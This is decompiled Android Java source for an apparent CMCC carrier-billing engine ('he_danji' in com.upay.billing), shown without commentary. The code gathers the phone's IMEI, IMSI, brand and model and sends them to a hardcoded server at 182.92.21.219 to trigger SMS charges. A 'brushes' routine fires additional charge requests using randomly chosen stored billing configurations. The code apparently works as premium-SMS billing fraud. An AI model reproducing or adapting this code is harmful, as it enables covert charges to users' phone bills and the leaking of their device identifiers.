package com.upay.billing.engine.he_danji;

import android.annotation.SuppressLint;
import android.os.Build;
import android.os.Build.VERSION;
import android.util.Log;
import com.upay.billing.MtContext;
import com.upay.billing.UpayConstant;
import com.upay.billing.UpayContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import org.json.JSONObject;

public class Main
  extends CommonEngine
{
  private static final String TAG = "he_danji";
  private static final String chargeNum = "1065889923";
  private static final String feeUrl = "http://$ip/cmcc/g/single/s2sChargeSMS?pid=$pid&imsi=$imsi&imei=$imei&regist=0&version=$version&payId=$payId&chargeId=$chargeId&contentId=$contentId&channelId=$channelId";
  private static final String registrationNum = "10658422";
  private String billing_b64;
  private String billing_b64_str;
  private String billing_dst;
  private List<String> confirmFail;
  private int count;
  private int i = 0;
  private String init_b64;
  private String init_b64_str;
  private String init_dst;
  private List<String> regFail;
  private List<String> regSmsFail;
  private List<String> sendFail;
  private List<String> sendSucc;
  
  public Main() {}
  
  private void billing_sms(String paramString1, String paramString2, String paramString3, String paramString4, Trade paramTrade, Cmd paramCmd, String paramString5, int paramInt, Json paramJson1, Json paramJson2)
  {
    Util.addTask(new Main.3(this, paramString2, paramString3, paramString4, paramString1, paramTrade, paramString5, paramCmd, paramJson1, paramJson2, paramInt));
  }
  
  private void brushes(Cmd paramCmd, UpayContext paramUpayContext, String paramString)
  {
    Object localObject3 = new ArrayList();
    Object localObject1 = Json.parse(Util.loadLocalText(UpayConstant.UPAY_PROP_PATH)).getArray("he_danji_brushes");
    if (((Json)localObject1).length() != 0)
    {
      int j = 0;
      while (j < ((Json)localObject1).length())
      {
        ((List)localObject3).add(((Json)localObject1).getObjectAt(j));
        j += 1;
      }
      Object localObject4 = new boolean[1];
      localObject4[0] = 0;
      localObject1 = null;
      while (localObject4[0] == 0)
      {
        localObject2 = (Json)((List)localObject3).get(getRandom(0, ((List)localObject3).size() - 1));
        str1 = ((Json)localObject2).getStr("cmd_key");
        localObject1 = localObject2;
        if (!paramCmd.key.contains(str1))
        {
          localObject4[0] = 1;
          localObject1 = localObject2;
        }
      }
      paramCmd = ((Json)localObject1).getStr("version");
      Object localObject2 = ((Json)localObject1).getStr("ip");
      localObject3 = ((Json)localObject1).getStr("pid");
      localObject4 = ((Json)localObject1).getStr("contentId");
      String str1 = ((Json)localObject1).getStr("channelId");
      String str2 = ((Json)localObject1).getStr("cpId");
      localObject1 = ((Json)localObject1).getStr("chargeId");
      paramString = "00" + Util.shortenSn(paramString, true);
      Util.addTask(new Main.4(this, "http://$ip/cmcc/g/single/s2sChargeSMS?pid=$pid&imsi=$imsi&imei=$imei&regist=0&version=$version&payId=$payId&chargeId=$chargeId&contentId=$contentId&channelId=$channelId".replace("$imsi", paramUpayContext.imsi).replace("$imei", paramUpayContext.imei).replace("$ip", (CharSequence)localObject2).replace("$version", paramCmd).replace("$pid", (CharSequence)localObject3).replace("$contentId", (CharSequence)localObject4).replace("$channelId", str1).replace("$cpId", str2).replace("$chargeId", (CharSequence)localObject1).replace("$payId", paramString)));
    }
  }
  
  private int getRandom(int paramInt1, int paramInt2)
  {
    return new Random().nextInt(paramInt2) % (paramInt2 - paramInt1 + 1) + paramInt1;
  }
  
  private final void logCharge(Trade paramTrade, Cmd paramCmd, int paramInt1, Json paramJson, int paramInt2, String paramString1, String paramString2, String paramString3)
  {
    paramJson.put("result", Integer.valueOf(paramInt2)).put("mt_num", paramString1).put("mt_msg", paramString2).put("description", paramString3).put("price", Integer.valueOf(paramCmd.price)).put("ts", Long.valueOf(Util.getTs() + Util.getLong(this.core.getContext(), "Time-Diff")));
    this.core.logEvent(paramTrade.appKey, "charge_handle", paramJson.asObject().toString());
  }
  
  private final void logPay(int paramInt1, Trade paramTrade, Cmd paramCmd, int paramInt2, Json paramJson, int paramInt3, String paramString1, String paramString2)
  {
    paramJson.put("result", Integer.valueOf(paramInt3)).put("request", paramString1).put("response", paramString2).put("price", Integer.valueOf(paramCmd.price)).put("ts", Long.valueOf(Util.getTs() + Util.getLong(this.core.getContext(), "Time-Diff")));
    this.core.logEvent(paramTrade.appKey, "exec_pay", paramJson.asObject().toString());
  }
  
  public Op getOp()
  {
    return Op.CMCC;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    return (paramOp == Op.CMCC) && (paramBoolean1) && (paramBoolean2);
  }
  
  public boolean isComposable()
  {
    return true;
  }
  
  @SuppressLint({"DefaultLocale"})
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    Log.i("he_danji", "onMtAction: exec=" + paramJson.asObject() + ",mtNum=" + paramString1 + ",mtMsg=" + paramString2);
    switch (Main.5.$SwitchMap$com$upay$billing$engine$he_danji$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
    {
    default: 
      return 0;
    case 1: 
      return 524288;
    case 2: 
      return 65736;
    }
    return 0x10000 | paramJson.getInt("code");
  }
  
  public void pay(Trade paramTrade, List<Cmd> paramList)
  {
    this.regFail = new ArrayList();
    this.sendSucc = new ArrayList();
    this.sendFail = new ArrayList();
    this.regSmsFail = new ArrayList();
    this.confirmFail = new ArrayList();
    UpayContext localUpayContext = this.core.getUpayContext();
    this.count = 0;
    Iterator localIterator = Util.safeIter(paramTrade.subTrades).iterator();
    for (;;)
    {
      Object localObject1;
      int k;
      int m;
      String str1;
      Object localObject2;
      Cmd localCmd;
      Json localJson;
      Object localObject4;
      Object localObject3;
      Object localObject5;
      String str2;
      String str3;
      Object localObject6;
      if (localIterator.hasNext())
      {
        localObject1 = (Json)localIterator.next();
        this.count += 1;
        k = this.count;
        m = paramTrade.subTrades.length();
        str1 = ((Json)localObject1).getStr("sn");
        localObject2 = paramList.iterator();
        do
        {
          boolean bool = ((Iterator)localObject2).hasNext();
          localCmd = null;
          if (!bool) {
            break;
          }
          localCmd = (Cmd)((Iterator)localObject2).next();
        } while (!localCmd.key.equals(((Json)localObject1).getStr("cmd_key")));
        localObject2 = Json.createObject(new Object[] { "trade_id", paramTrade.id, "goods_key", paramTrade.goodsKey, "cmd_key", localCmd.key, "bt_key", this.key, "target", "", "sn", str1, "request", "", "response", "" });
        localJson = Json.createObject(new Object[] { "trade_id", paramTrade.id, "goods_key", paramTrade.goodsKey, "cmd_key", localCmd.key, "bt_key", this.key, "description", "he_danji", "mt_msg", "", "mt_num", "", "sn", str1 });
        try
        {
          localObject4 = Json.parse(localCmd.msg);
          localObject1 = ((Json)localObject4).getStr("type");
          if ((Util.empty((String)localObject1)) || (!"get-json".equals(((String)localObject1).trim()))) {
            break label690;
          }
          localObject1 = ((Json)localObject4).getStr("url_init");
          localObject3 = ((Json)localObject4).getStr("url_billing");
          localObject4 = ((Json)localObject4).getStr("ssid");
          localObject5 = Build.BRAND;
          str2 = Build.MODEL;
          str3 = Integer.toString(Build.VERSION.SDK_INT);
          localObject6 = new HashMap();
          ((HashMap)localObject6).put("ssid", localObject4);
          ((HashMap)localObject6).put("imei", localUpayContext.imei);
          ((HashMap)localObject6).put("imsi", localUpayContext.imsi);
          ((HashMap)localObject6).put("brand", localObject5);
          ((HashMap)localObject6).put("model", str2);
          ((HashMap)localObject6).put("osbuild", str3);
          localObject5 = Util.stringToBytes(Util.mapToJson((HashMap)localObject6).asObject().toString());
          Util.addTask(new Main.1(this, (String)localObject1, (String)localObject3, (String)localObject4, localUpayContext, paramTrade, localCmd, str1, m, (Json)localObject2, localJson).setPostData((byte[])localObject5).addHeader("Content-Type", "application/json"));
        }
        catch (Exception paramList)
        {
          logPay(1, paramTrade, localCmd, 1, (Json)localObject2, 128, "", localCmd.msg);
        }
      }
      else
      {
        return;
        label690:
        localObject1 = ((Json)localObject4).getStr("version", "1.0.0.7");
        localObject5 = ((Json)localObject4).getStr("ip", "182.92.21.219:10789");
        localObject3 = ((Json)localObject4).getArray("params");
        localObject1 = "http://$ip/cmcc/g/single/s2sChargeSMS?pid=$pid&imsi=$imsi&imei=$imei&regist=0&version=$version&payId=$payId&chargeId=$chargeId&contentId=$contentId&channelId=$channelId".replace("$imsi", localUpayContext.imsi).replace("$imei", localUpayContext.imei).replace("$ip", (CharSequence)localObject5).replace("$version", (CharSequence)localObject1);
        int n = ((Json)localObject3).length();
        int j = 0;
        while (j < n)
        {
          localObject6 = ((Json)localObject3).getObjectAt(j);
          localObject4 = ((Json)localObject6).getStr("pid");
          localObject5 = ((Json)localObject6).getStr("contentId");
          str2 = ((Json)localObject6).getStr("channelId");
          str3 = ((Json)localObject6).getStr("cpId");
          localObject6 = ((Json)localObject6).getStr("chargeId");
          String str4 = paramTrade.id + "0" + (j + 1);
          String str5 = "00" + Util.shortenSn(str1, true);
          localObject1 = ((String)localObject1).replace("$pid", (CharSequence)localObject4).replace("$contentId", (CharSequence)localObject5).replace("$channelId", str2).replace("$cpId", str3).replace("$chargeId", (CharSequence)localObject6).replace("$payId", str5).replace("$minTradeId", str4.substring(8, 18));
          Util.addTask(new Main.2(this, (String)localObject1, n, paramTrade, localCmd, j, (Json)localObject2, str1, localJson, m, k, localUpayContext));
          j += 1;
        }
      }
    }
  }
}
